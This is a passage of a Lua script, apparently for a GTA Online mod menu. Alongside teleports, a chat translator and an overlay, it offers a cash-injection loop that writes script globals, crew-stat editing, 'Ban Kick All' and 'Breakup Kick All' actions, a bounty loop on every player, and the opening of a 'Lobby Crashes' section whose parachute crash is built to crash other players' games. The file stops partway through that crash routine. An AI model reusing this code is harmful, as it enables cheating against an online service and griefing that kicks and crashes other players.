    {"Mining Tunnels", {x=-595.48505, y=2086.4502, z=131.38136}, ""},
    {"Omegas Garage", {x=2330.2573, y=2572.3005, z=46.679367}, ""},
    {"50 Car Garage", {x=520.0, y=-2625.0, z=-50.0}, ""},
    {"Server Farm", {x=2474.0847, y=-332.58887, z=92.9927}, ""},
    {"Character Creation", {x=402.91586, y=-998.5701, z=-99.004074}, ""},
    {"Life Invader Building", {x=-1082.8595, y=-254.774, z=37.763317}, ""},
    {"Mission End Garage", {x=405.9228, y=-954.1149, z=-99.6627}, ""},
    {"Destroyed Hospital", {x=304.03894, y=-590.3037, z=43.291893}, ""},
    {"Stadium", {x=-256.92334, y=-2024.9717, z=30.145584}, ""},
    {"Comedy Club", {x=-430.00974, y=261.3437, z=83.00648}, ""},
    {"Record A Studios", {x=-1010.6883, y=-49.127754, z=-99.40313}, ""},
    {"Bahama Mamas Nightclub", {x=-1394.8816, y=-599.7526, z=30.319544}, ""},
    {"Janitors House", {x=-110.20285, y=-8.6156025, z=70.51957}, ""},
    {"Therapists House", {x=-1913.8342, y=-574.5799, z=11.435149}, ""},
    {"Martin Madrazos House", {x=1395.2512, y=1141.6833, z=114.63437}, ""},
    {"Floyds Apartment", {x=-1156.5099, y=-1519.0894, z=10.632717}, ""},
    {"Michaels House", {x=-813.8814, y=179.07889, z=72.15914}, ""},
    {"Franklins House (Strawberry)", {x=-14.239959, y=-1439.6913, z=31.101551}, ""},
    {"Franklins House (Vinewood Hills)", {x=7.3125067, y=537.3615, z=176.02803}, ""},
    {"Trevors House", {x=1974.1617, y=3819.032, z=33.436287}, ""},
    {"Lesters House", {x=1273.898, y=-1719.304, z=54.771}, ""},
    {"Lesters Warehouse", {x=713.5684, y=-963.64795, z=30.39534}, ""},
    {"Lesters Office", {x=707.2138, y=-965.5549, z=30.412853}, ""},
    {"Meth Lab", {x=1391.773, y=3608.716, z=38.942}, ""},
    {"Acid Lab", {x=484.69, y=-2625.36, z=-49.0}, ""},
    {"Morgue Lab", {x=495.0, y=-2560.0, z=-50.0}, ""},
    {"Humane Labs", {x=3625.743, y=3743.653, z=28.69009}, ""},
    {"Motel Room", {x=152.2605, y=-1004.471, z=-99.024}, ""},
    {"Police Station", {x=443.4068, y=-983.256, z=30.689589}, ""},
    {"Bank Vault", {x=263.39627, y=214.39891, z=101.68336}, ""},
    {"Blaine County Bank", {x=-109.77874, y=6464.8945, z=31.626724}, ""},
    {"Tequi-La-La Bar", {x=-564.4645, y=275.5777, z=83.074585}, ""},
    {"Scrapyard Body Shop", {x=485.46396, y=-1315.0614, z=29.2141}, ""},
    {"The Lost MC Clubhouse", {x=980.8098, y=-101.96038, z=74.84504}, ""},
    {"Vangelico Jewlery Store", {x=-629.9367, y=-236.41296, z=38.057056}, ""},
    {"Airport Lounge", {x=-913.8656, y=-2527.106, z=36.331566}, ""},
    {"Morgue", {x=240.94368, y=-1379.0645, z=33.74177}, ""},
    {"Union Depository", {x=1.298771, y=-700.96967, z=16.131021}, ""},
    {"Fort Zancudo Tower", {x=-2357.9187, y=3249.689, z=101.45073}, ""},
    {"Agency Interior", {x=-1118.0181, y=-77.93254, z=-98.99977}, ""},
    {"Agency Garage", {x=-1071.0494, y=-71.898506, z=-94.59982}, ""},
    {"Terrobyte Interior", {x=-1421.015, y=-3012.587, z=-80.000}, ""},
    {"Bunker Interior", {x=899.5518,y=-3246.038, z=-98.04907}, ""},
    {"IAA Office", {x=128.20, y=-617.39, z=206.04}, ""},
    {"FIB Top Floor", {x=135.94359, y=-749.4102, z=258.152}, ""},
    {"FIB Floor 47", {x=134.5835, y=-766.486, z=234.152}, ""},
    {"FIB Floor 49", {x=134.635, y=-765.831, z=242.152}, ""},
    {"Big Fat White Cock", {x=-31.007448, y=6317.047, z=40.04039}, ""},
    {"Strip Club DJ Booth", {x=121.398254, y=-1281.0024, z=29.480522}, ""},
}

    menu.action(online, "Check Lobby for GodMode", {}, "Checks the entire lobby for godmode, and notifies you of their names.", function()
        CheckLobbyForGodmode()
    end)

    block_blaming = menu.ref_by_path("Online>Protections>Block Blaming")
    menu.toggle_loop(online, "Disable Block Blaming While Shooting", {"blameaim"}, "Still keep the benefits of block blaming but also be able to deal damage to other players.", function(blame)
        if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
            block_blaming.value = false
        elseif not blame then
            block_blaming.value = true
        end
    end)

    menu.toggle_loop(online, "Disable Block Entity Spam For Missions", {}, "Will automatically disable 'Block Entity Spam' while in missions to prevent them from messing up.", function()
        local EntitySpam = menu.ref_by_path("Online>Protections>Block Entity Spam>Block Entity Spam")
        if NETWORK.NETWORK_IS_ACTIVITY_SESSION() == true then
            if not menu.get_value(EntitySpam) then return end
            menu.trigger_command(EntitySpam, "off")
        else
            if menu.get_value(EntitySpam) then return end
            menu.trigger_command(EntitySpam, "on")
        end
    end)

    menu.toggle_loop(online,  "Block Orbital Cannon", {"blockorb"}, "", function() -- credit to lance, just cleaned it up a bit.
        local mdl = util.joaat("h4_prop_h4_garage_door_01a")
        RequestModel(mdl)
        if orb_obj == nil or not ENTITY.DOES_ENTITY_EXIST(orb_obj) then
            orb_obj = entities.create_object(mdl, v3(335.9, 4833.9, -59.0))
            entities.set_can_migrate(entities.handle_to_pointer(orb_obj), false)
            ENTITY.SET_ENTITY_HEADING(orb_obj, 125.0)
            ENTITY.FREEZE_ENTITY_POSITION(orb_obj, true)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(orb_obj, players.user_ped(), false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(players.user_ped(), orb_obj, false) -- have to do this both way for collision to be properly avoided between player ped and the object
        end
        util.yield(50)
    end, function()
        if orb_obj ~= nil then
            entities.delete_by_handle(orb_obj)
        end
    end)

    menu.toggle_loop(online, "Max Lockon Range", {}, "You can lock on to any vehicle or player at any distance.", function()
        PLAYER.SET_PLAYER_LOCKON_RANGE_OVERRIDE(players.user(), 99999999.0)
    end)
    
    menu.toggle_loop(online, "Script Host Addiction", {}, "You become addicted to being the Script Host (Could Help Prevent Some Shitty Kicks) \nNote: Don't Use With Never Script Host, It Will Break The Session and Also Become Pointless", function()
        util.yield(500)
        if players.get_script_host() ~= players.user() and Fewd.get_spawn_state(players.user()) ~= 0 then
            menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.user())..">Friendly>Give Script Host"))
        else
            util.yield(275)
            menu.trigger_commands("scripthost")
        end
    end)

    menu.toggle_loop(online, "Never Script Host", {"neversh"}, "You never become the Script Host (Could Sometimes Help Prevent Kicks Related To Having Script Host) \nNote: Don't Use With Script Host Addiction, It Will Break The Session and Also Become Pointless", function()
        util.yield(500)
        if players.get_script_host() == players.user() then
            menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(players.get_host())..">Friendly>Give Script Host"))
        end
    end)

    local moneywoo = menu.list(online, "Money & RP Options", {}, "Need I Say More?")

    function SET_INT_GLOBAL(global, value)
        memory.write_int(memory.script_global(global), value)
    end

    menu.toggle_loop(moneywoo, "Start $500k + $750k Loop", {""}, "500k + 750k Loop Every 10 Seconds. Warning! Dont spend over 50 million a day. If cash stops it will start again in 60 seconds. \nCould Be Risky Idk", function()
        SET_INT_GLOBAL(1969112, 1)
        util.log("$500K Added")
        util.yield(250)
        menu.trigger_commands("accepterrors")
        util.yield(250)
        menu.trigger_commands("accepterrors")
        util.yield(300)
        menu.trigger_commands("accepterrors")
        util.yield(150)
        menu.trigger_commands("accepterrors")
        util.yield(15500)
        SET_INT_GLOBAL(1969112, 2)
        util.log("$750K Added")
        util.yield(250)
        menu.trigger_commands("accepterrors")
        util.yield(250)
        menu.trigger_commands("accepterrors")
        util.yield(300)
        menu.trigger_commands("accepterrors")
        util.yield(150)
        menu.trigger_commands("accepterrors")
        util.yield(27000)
    end)

    menu.toggle(moneywoo, "Money Drop All", {"cashloopall"}, "Money Drops All Players", function()
        for _, player_id in players.list(false, false, true) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = players.get_position(ped)
            if ENTITY.DOES_ENTITY_EXIST(ped) then
            menu.trigger_commands("cashloop " .. PLAYER.GET_PLAYER_NAME(player_id))
            end
        end
    end)

    menu.toggle(moneywoo, "RP Drop All", {"rploopall"}, "Drops RP To All Players", function()
        for _, player_id in players.list(false, false, true) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = players.get_position(ped)
            if ENTITY.DOES_ENTITY_EXIST(ped) then
            menu.trigger_commands("dropfigures " .. PLAYER.GET_PLAYER_NAME(player_id))
            end
        end
    end)

    local tps = menu.list(online, "Teleports", {}, "Places To TP To")

    for index, data in interiors do
        local location_name = data[1]
        local location_coords = data[2]
        local text = data[3]
        menu.action(tps, location_name, {}, text, function()
            menu.trigger_commands("doors on")
            menu.trigger_commands("nodeathbarriers on")
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), location_coords.x, location_coords.y, location_coords.z, false, false, false)
        end)
    end

    local fewmodmisc = menu.list(uwuonline, "FewMod Misc", {}, "")

    menu.action(fewmodmisc, "Fix Mission/Jobs", {"fixmissions"}, "Fixes Options You Might Have Enabled To Allow You To Play Missions/Jobs \n(NoRistrictedAreas)", function()
        menu.trigger_commands("norestrictedareas ".."off")
    end)

    menu.action(fewmodmisc, "Undo Fixes For Mission", {"fixmissions"}, "Re-Enables Options It Disabled From 'Fix Missions/Jobs' \n(NoRistrictedAreas)", function()
        menu.trigger_commands("norestrictedareas ".."off")
    end)

    menu.action(fewmodmisc, "Anticrashcamera", {}, "Put this here for redundancy", function()
        menu.trigger_commands("anticrashcam")
    end)

    menu.toggle(fewmodmisc, "Toggle Anticrashcam", {"acc"}, "Put this here for redundancy", function(on_toggle)
        if on_toggle then
            menu.trigger_commands("anticrashcam on")
            menu.trigger_commands("potatomode on")
        else
            menu.trigger_commands("anticrashcam off")
            menu.trigger_commands("potatomode off")
        end
    end)

    menu.toggle(fewmodmisc, "Hide From Crashes", {}, "Tries to block crashes by Using some game natives and menu functions.", function(on_toggle)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
        local ped = PLAYER.GET_PLAYER_PED(players.user())
        if on_toggle then
            util.yield(300)
            ENTITY.SET_ENTITY_COORDS(ped, 35.05--[[x]], 7690.07--[[y]], 2.68--[[z]], 1, false)
            util.yield(600)
            menu.trigger_commands("spoofpos ".."on")
            util.toast("Spoofed Position")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("anticrashcamera on")
            menu.trigger_commands("trafficpotato on")
            util.yield(2000)
            menu.trigger_commands("clearworld")
        else        
            menu.trigger_commands("spoofpos ".."off")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("anticrashcamera off")
            menu.trigger_commands("trafficpotato off")
            util.yield(800)
            ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, false)
            util.yield(500)
            menu.trigger_commands("clearworld")
            util.yield(1000)
            menu.trigger_commands("cleararea")
        end
    end)

    menu.action(fewmodmisc, "Restart Natives", {}, "Tries restarting some natives.", function()
        --local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player = PLAYER.PLAYER_PED_ID()
        ENTITY.FREEZE_ENTITY_POSITION(player, false)
        MISC.OVERRIDE_FREEZE_FLAGS()
        menu.trigger_commands("clearworld")
    end)

    menu.toggle(fewmodmisc, "Panic Mode", {"panic"}, "This renders an anti-crash mode removing all kinds of events from the game at all costs.", function(on_toggle)
        local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
        local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
        local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
        local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
        if on_toggle then
            menu.trigger_commands("desyncall on")
            menu.trigger_commands("potatomode on")
            menu.trigger_commands("trafficpotato on")
            menu.trigger_command(BlockIncSyncs)
            menu.trigger_command(BlockNetEvents)
            menu.trigger_commands("anticrashcamera on")
        else
            menu.trigger_commands("desyncall off")
            menu.trigger_commands("potatomode off")
            menu.trigger_commands("trafficpotato off")
            menu.trigger_command(UnblockIncSyncs)
            menu.trigger_command(UnblockNetEvents)
            menu.trigger_commands("anticrashcamera off")
        end
    end)

    menu.toggle_loop(uwuonline, "Bounty All Loop", {}, "Gives Everyone In The Session A Bounty", function()
        menu.trigger_commands("bountyall 10000")
    end)

    menu.action(uwuonline, "Breakup Kick All", {}, "Breakup Kicks Everyone In The Session", function()
        menu.trigger_commands("breakupall")
    end)

    menu.action(uwuonline, "Ban Kick All", {}, "Discretely Kicks Everyone In The Session", function()
        menu.trigger_commands("banall")
    end)

    ------------------------------------------------------------------------------------------------------------------------------------------------------

    local function get_stat_int(stat)
        local ptr = memory.alloc_int()
        STATS.STAT_GET_INT(util.joaat(stat), ptr, -1)
        return memory.read_int(ptr)
    end
    
    local function set_stat_int(stat, value)
        STATS.STAT_SET_INT(util.joaat(stat), value, true)
    end
    
    local Crew = menu.list(online, "Crew Options", {}, "")
    
    menu.divider(Crew, "Crew Level Editor")
    
    for i = 0, 4, 1 do
        i = tostring(i)
        local crew_level_stat = "MPPLY_CREW_LOCAL_XP_" .. i
        local crew_id_stat = "MPPLY_CREW_" .. i .. "_ID"
    
        local crew_current_menu
        local crew_id_menu
        local crew_rp_menu
    
        local crew_menu = menu.list(Crew, "Crew " .. i, {}, "", function()
            local crew_id = get_stat_int(crew_id_stat)
            local crew_rp = get_stat_int(crew_level_stat)
    
            menu.set_value(crew_id_menu, crew_id)
            menu.set_value(crew_rp_menu, crew_rp)
    
            local current_crew_level = get_stat_int("MPPLY_CURRENT_CREW_RANK")
            if current_crew_level > 8000 then current_crew_level = 8000 end
            if current_crew_level < 1 then current_crew_level = 1 end
            local current_crew_rp_min = util.get_rp_required_for_rank(current_crew_level)
            local current_crew_rp_max = util.get_rp_required_for_rank(current_crew_level + 1)
    
            if crew_rp >= current_crew_rp_min and crew_rp < current_crew_rp_max then
                menu.set_value(crew_current_menu, current_crew_level)
                menu.set_visible(crew_current_menu, true)
            else
                menu.set_visible(crew_current_menu, false)
            end
        end)
    
        crew_id_menu = menu.readonly(crew_menu, "Crew ID")
        crew_rp_menu = menu.readonly(crew_menu, "Crew RP")
        crew_current_menu = menu.readonly(crew_menu, "Crew Level [Current]")
    
    
        local crew_level = menu.slider(crew_menu, "Crew Level", { "crew" .. i .. "level" }, "", 1, 8000, 1, 1,
            function(value)
            end)
    
        menu.action(crew_menu, "Set Crew Level", { "setcrew" .. i .. "level" }, "", function()
            local rp = util.get_rp_required_for_rank(menu.get_value(crew_level))
            set_stat_int(crew_level_stat, rp)
            util.toast("Done!")
        end)
    end

    focusref = {}
isfocused = false
selectedcoloraddict = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")

function save()
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..teamchatlabel..'"'..string.char(10)..'allchatlabel = "'..allchatlabel..'"')
	configfile:close()
end


if not filesystem.exists(filesystem.store_dir().."chat_translator//config.txt") then
	filesystem.mkdir(filesystem.store_dir().."chat_translator//")
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..util.get_label_text("MP_CHAT_TEAM")..'"'..string.char(10)..'allchatlabel = "'..util.get_label_text("MP_CHAT_ALL")..'"')
	configfile:close()
	colorselec = 1
else
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt")
	configfiledata = configfile:read("*all")
	configfile:close()
	load(configfiledata)()
end
util.ensure_package_is_installed("lua/ScaleformLib")
local sf = require("lib.ScaleformLib")("instructional_buttons")
local sfchat = require("lib.ScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()

local Languages = {
    { Name = "English", Key = "en" },
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}


local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function do_label_preset(label, text)
    menu.trigger_commands("addlabel " .. label)
    local prep = "edit" .. string.gsub(label, "_", "") .. " " .. text
    menu.trigger_commands(prep)

    menu.trigger_commands("labelpresets")
    util.toast("Label Set!")
end

local chat_trans = menu.list(online, "Chat Translator")

settingtrad = menu.list(chat_trans, "Settings For Translation")


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] translation message", {"labelteam"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] translation message", {"labelall"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangaddict = menu.textslider(chat_trans, "Target Language", {}, "You need to click to apply change", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocaaddict = menu.textslider(settingtrad, "Location of Translated Message", {}, "You need to click to apply change", {"Global Chat networked", "Global Chat not networked", "Team Chat not networked", "Team Chat networked", "notification"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "Translate Yourself", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "Translate even if the language is the same as the desired one", {}, "might not work correctly because google is dumb", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "Use the old method", {}, players.get_name(players.user()).." [ALL] player_sender : their message", function(on)
	oldway = on	
end)
traduct = false
menu.toggle(chat_trans, "Translator On/Off", {}, "", function(on)
	traduct = on
end, false)

traductmymessage = menu.list(chat_trans, "Send Translated Message")
finallangaddict = menu.textslider(traductmymessage, "Final Language", {"finallang"}, "Final Languge of your message.																	  You need to click to aply change", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "Send Message", {"Sendmessage"}, "Input the text For your message", function(on_click)
    util.toast("Please input your message")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = "[Translation] "..players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message("[Translation] "..players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message("[Translation] "..players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast("[Translation] "..players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)


run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocaaddict)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangaddict)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangaddict)]]
	util.yield()
	run = run+1
end

play_info = menu.list(online, "Player Information Overlay", {}, "")

--
menu.action(online, "Modder List To Chat", {"bcmodderlist"}, "Sends the sessions list of modders in chat", function()
    local modders = getModderList()
    chat.send_message("# Modders In This Session ("..table.getn(modders).."): "..table.concat(playerListToNames(modders), ", "), false, true, true)
end)

players_info = menu.toggle_loop(play_info,"Toggle",{},"Turns The Player Information Overlay On\nUse Save Config For Other Options",function()
    infoverplaytoggle()
end)
menu.set_value(players_info, config_active6)
infoverplay = menu.list(play_info, "Options", {}, "")
    menu.divider(infoverplay, "Location")
    menu.slider_float(infoverplay, "X:", {"overlayx"}, "X Position Of The Overlay.", 0, 1000, 0, 1, function(s)
        gui_x = s/1000
    end)
    menu.slider_float(infoverplay, "Y:", {"overlayy"}, "Y Position Of The Overlay.", 0, 1000, 0, 1, function(s)
        gui_y = s/1000
    end)
    menu.divider(infoverplay, "Appearance")
    colours = menu.list(infoverplay, "Overlay Color", {}, "")
        menu.divider(colours, "Elements")
        menu.colour(colours, "Title Color", {"overlaytitle_bar"}, "Color Of The Title.", infocolour.title_bar, true, function(on_change)
            title_bar_color(on_change)
        end)
        menu.colour(colours, "Overlay Background Color", {"overlaybg"}, "Color Of The Background.", infocolour.background, true, function(on_change)
            infocolour.background = on_change
        end)
        menu.colour(colours, "Health Color", {"overlayhealth_bar"}, "Color Of The Health.", infocolour.health_bar, true, function(on_change)
            infocolour.health_bar = on_change
        end)
        menu.colour(colours, "Armour Color", {"overlayarmour_bar"}, "Color Of The Armour.", infocolour.armour_bar, true, function(on_change)
            infocolour.armour_bar = on_change
        end)
        menu.colour(colours, "Blip Color", {"overlayblip"}, "Color Of The Blip.", infocolour.blip, true, function(on_change)
            infocolour.blip = on_change
        end)
        menu.colour(colours, "Map Colour", {"overlaymap"}, "Colour of the map.", infocolour.map, true, function(on_change)
            infocolour.map = on_change
        end)
        menu.divider(colours, "Text")
        menu.colour(colours, "Name Color", {"overlayname"}, "Color Of The Name Text.", infocolour.name, true, function(on_change)
            infocolour.name = on_change
        end)
        menu.colour(colours, "Label Color", {"overlaylabel"}, "Color Of The Label Text.", infocolour.label, true, function(on_change)
            infocolour.label = on_change
        end)
        menu.colour(colours, "Informantion Color", {"overlayinfo"}, "Color Of The Info Text.", infocolour.info, true, function(on_change)
            infocolour.info = on_change
        end)
    element_dim = menu.list(infoverplay, "Component Size & Spacing", {}, "")
        menu.divider(element_dim, "Component Size & Spacing")
        menu.slider(element_dim, "Title Bar Hieght", {}, "The Height of The Title Bar.", 0, 100, 22, 1, function(on_change)
            name_h = on_change/1000
        end)
        menu.slider(element_dim, "Information Display Column Width", {}, "The Width Of The Text Window Minus The Width Of The Padding.", 0, 50, 16, 1, function(on_change)
            gui_w = on_change/100
        end)
        menu.slider(element_dim, "Filling", {}, "Padding Around Info Text.", 0, 30, 8, 1, function(on_change)
            padding = on_change/1000
        end)
        menu.slider(element_dim, "Interval", {}, "Spacing Between Different Elements.", 0, 20, 3, 1, function(on_change)
            spacing = on_change/1000
        end)
    text_dim = menu.list(infoverplay, "Text Size & Spacing", {}, "")
        menu.divider(text_dim, "Text Size & Spacing")
        menu.slider_float(text_dim, "Name", {}, "Player Name Text Size.", 0, 100, 52, 1, function(on_change)
            name_size = on_change/100
        end)
        menu.slider_float(text_dim, "Message Text", {}, "Information Text Size.", 0, 100, 41, 1, function(on_change)
            text_size = on_change/100
        end)
        menu.slider(text_dim, "Line Spacing", {}, "Spacing Between Lines of Info Text.", 0, 100, 32, 1, function(on_change)
            line_spacing = on_change/10000
        end)
    border = menu.list(infoverplay, "Border", {}, "")
        menu.divider(border, "Border Settings")
        menu.slider(border, "Width", {}, "The Width Of The Border Rendered Around The Element.", 0, 20, 0, 1, function(on_change)
            border_widthd(on_change)
        end)
        local border_c_slider = menu.colour(border, "Color", {"overlayborder"}, "Color Of The Rendered Border.", infocolour.border, true, function(on_change)
            infocolour.border = on_change
        end)
        menu.rainbow(border_c_slider)
end

::skipplayerinformation::

    ------------------------------------------------------------------------------------------------------------------------------------------------------
    
    menu.divider(online, "Lobby Crashes")

    -- Originally Just An Edit Of Some Parachute Crash
    
    menu.action(online, "Fewdy's Parachute Crash", {"FewModParachute"}, "It's Meh - Blocked By Good Menu's", function()
    
        local gwobaw = memory.script_global(2672505 + 1685 + 756) -- Global_2672505.f_1685.f_756
        if PED.IS_PED_DEAD_OR_DYING(players.user_ped()) then
            GRAPHICS.ANIMPOSTFX_STOP_ALL()
            memory.write_int(gwobaw, memory.read_int(gwobaw) | 1 << 1)
        end
            PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
            ------------------------------------------------------------------------ Para 1
            object_hash1 = 2099682835 -- Pipes
                STREAMING.REQUEST_MODEL(object_hash1)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash1)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
                util.yield(1000)
                PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
                util.yield(1000)
                menu.trigger_commands("tpmazehelipad")
                ------------------------------------------------------------------------ Para 2
            object_hash2 = 3601491972 -- Crack Pipe
                STREAMING.REQUEST_MODEL(object_hash2)
                PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), object_hash2)
